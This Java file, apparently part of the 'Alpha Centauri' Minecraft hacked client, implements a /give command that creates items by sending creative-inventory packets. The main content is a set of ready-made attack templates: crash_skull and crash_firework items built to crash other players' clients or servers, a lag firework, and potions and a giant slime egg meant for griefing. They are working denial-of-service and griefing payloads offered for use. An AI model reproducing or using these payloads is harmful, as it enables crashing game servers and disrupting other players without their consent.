package org.alphacentauri.commands;

import java.util.ArrayList;
import net.minecraft.client.Minecraft;
import net.minecraft.init.Items;
import net.minecraft.item.Item;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.JsonToNBT;
import net.minecraft.nbt.NBTException;
import net.minecraft.network.play.client.C10PacketCreativeInventoryAction;
import net.minecraft.util.ResourceLocation;
import org.alphacentauri.AC;
import org.alphacentauri.management.commands.Command;
import org.alphacentauri.management.commands.ICommandHandler;
import org.alphacentauri.management.util.TypeUtils;

public class CommandGive implements ICommandHandler {
   public String getName() {
      return "Give";
   }

   public boolean execute(Command command) {
      String[] Args = command.getArgs();
      if(Args.length == 0) {
         AC.addChat(this.getName(), "<item/templates> [amount] [meta] [nbt]");
      }

      (new Thread(() -> {
         if(Args.length >= 1) {
            boolean told = false;

            while(!Minecraft.getMinecraft().thePlayer.capabilities.isCreativeMode) {
               if(!told) {
                  AC.addChat(this.getName(), "Waiting for gamemode 1!");
                  told = true;
               }

               try {
                  Thread.sleep(50L);
               } catch (InterruptedException var10) {
                  var10.printStackTrace();
               }
            }

            Item item = null;
            int amount = 1;
            int metadata = 0;
            String nbt = null;
            item = (Item)Item.itemRegistry.getObject(new ResourceLocation(Args[0]));
            if(item == null && TypeUtils.isInteger(Args[0])) {
               item = Item.getItemById(Integer.parseInt(Args[0]));
            }

            if(item == null) {
               if(Args[0].equalsIgnoreCase("lag_firework")) {
                  item = Items.fireworks;
                  amount = 1;
                  metadata = 0;
                  nbt = "{Fireworks:{Flight:1,Explosions:[{Type:1,Flicker:125,Trail:1,Colors:[5320730,6719955],FadeColors:[14602026]}]}}";
               } else if(Args[0].equalsIgnoreCase("killer_potion")) {
                  item = Items.potionitem;
                  amount = 1;
                  metadata = 16392;
                  nbt = "{CustomPotionEffects:[{Id:6,Amplifier:125,Duration:59840}],display:{Name:\"Anti-Skid\"}}";
               } else if(Args[0].equalsIgnoreCase("troll_potion")) {
                  item = Items.potionitem;
                  amount = 1;
                  metadata = 16387;
                  nbt = "{CustomPotionEffects:[{Id:1,Amplifier:150,Duration:1999980},{Id:2,Amplifier:150,Duration:1999980},{Id:3,Amplifier:150,Duration:1999980},{Id:4,Amplifier:150,Duration:1999980},{Id:5,Amplifier:150,Duration:1999980},{Id:6,Amplifier:150,Duration:1999980},{Id:7,Amplifier:150,Duration:1999980},{Id:8,Amplifier:150,Duration:1999980},{Id:9,Amplifier:150,Duration:1999980},{Id:10,Amplifier:150,Duration:1999980},{Id:11,Amplifier:150,Duration:1999980},{Id:12,Amplifier:150,Duration:1999980},{Id:13,Amplifier:150,Duration:1999980},{Id:14,Amplifier:150,Duration:1999980},{Id:15,Amplifier:150,Duration:1999980},{Id:16,Amplifier:150,Duration:1999980},{Id:17,Amplifier:150,Duration:1999980},{Id:18,Amplifier:150,Duration:1999980},{Id:19,Amplifier:150,Duration:1999980},{Id:20,Amplifier:150,Duration:1999980},{Id:21,Amplifier:150,Duration:1999980},{Id:22,Amplifier:150,Duration:1999980},{Id:23,Amplifier:150,Duration:1999980}],display:{Name:\"GetRekt\"}}";
               } else if(Args[0].equalsIgnoreCase("crash_skull")) {
                  item = Items.skull;
                  amount = 1;
                  metadata = 3;
                  nbt = "{display:{Name:\"Alpha-Centauri.tk\"},SkullOwner:{Id:\"9d744c33-f3c4-4040-a7fc-73b47c840f0c\",Properties:{textures:[{Value:\"eyJ0ZXh0dXJlcyI6eyJTS0lOIjp7InVybCI6IiJ9fX0=\"}]}}}";
               } else if(Args[0].equalsIgnoreCase("crash_firework")) {
                  item = Items.fireworks;
                  amount = 1;
                  metadata = 0;
                  StringBuilder nbtBuilder = new StringBuilder();
                  nbtBuilder.append("{Fireworks:{Flight:0,Explosions:[");

                  for(int i = 0; i < 4000; ++i) {
                     nbtBuilder.append("{Type:1,Flicker:125,Trail:1,Colors:[").append(16777215).append("],FadeColors:[").append(16777215).append("]},");
                  }

                  nbtBuilder.deleteCharAt(nbtBuilder.length() - 1);
                  nbtBuilder.append("]}}");
                  nbt = nbtBuilder.toString();
               } else {
                  if(!Args[0].equalsIgnoreCase("mega_slime")) {
                     AC.addChat(this.getName(), "Available Templates:");
                     AC.addChat(this.getName(), "lag_firework");
                     AC.addChat(this.getName(), "killer_potion");
                     AC.addChat(this.getName(), "troll_potion");
                     AC.addChat(this.getName(), "crash_skull");
                     AC.addChat(this.getName(), "crash_firework");
                     AC.addChat(this.getName(), "mega_slime");
                     return;
                  }

                  item = Items.spawn_egg;
                  amount = 1;
                  metadata = 0;
                  nbt = "{EntityTag:{id:Slime,Size:100}}";
               }
            } else {
               if(Args.length >= 2) {
                  amount = this.parseAmount(item, Args[1]);
               }

               if(Args.length >= 3) {
                  if(!TypeUtils.isInteger(Args[2])) {
                     return;
                  }

                  metadata = Integer.valueOf(Args[2]).intValue();
               }

               if(Args.length >= 4) {
                  nbt = Args[3];

                  for(int i = 4; i < Args.length; ++i) {
                     nbt = nbt + " " + Args[i];
                  }
               }
            }

            ItemStack stack = new ItemStack(item, amount, metadata);
            if(nbt != null) {
               try {
                  stack.setTagCompound(JsonToNBT.getTagFromJson(nbt));
               } catch (NBTException var9) {
                  return;
               }
            }

            for(int i = 0; i < 9; ++i) {
               if(Minecraft.getMinecraft().thePlayer.inventory.getStackInSlot(i) == null) {
                  Minecraft.getMinecraft().thePlayer.sendQueue.addToSendQueue(new C10PacketCreativeInventoryAction(36 + i, stack));
                  AC.addChat(this.getName(), "Item" + (amount > 1?"s":"") + " created.");
                  return;
               }
            }

         }
      })).start();
      return true;
   }

   public String[] getAliases() {
      return new String[]{"give"};
   }

   public String getDesc() {
      return "Acts like /give";
   }

   public ArrayList autocomplete(Command cmd) {
      return new ArrayList();
   }

   private int parseAmount(Item item, String input) throws Error {
      if(!TypeUtils.isInteger(input)) {
         throw new Error();
      } else {
         int amount = Integer.valueOf(input).intValue();
         if(amount < 1) {
            throw new Error();
         } else if(amount > item.getItemStackLimit()) {
            throw new Error();
         } else {
            return amount;
         }
      }
   }
}
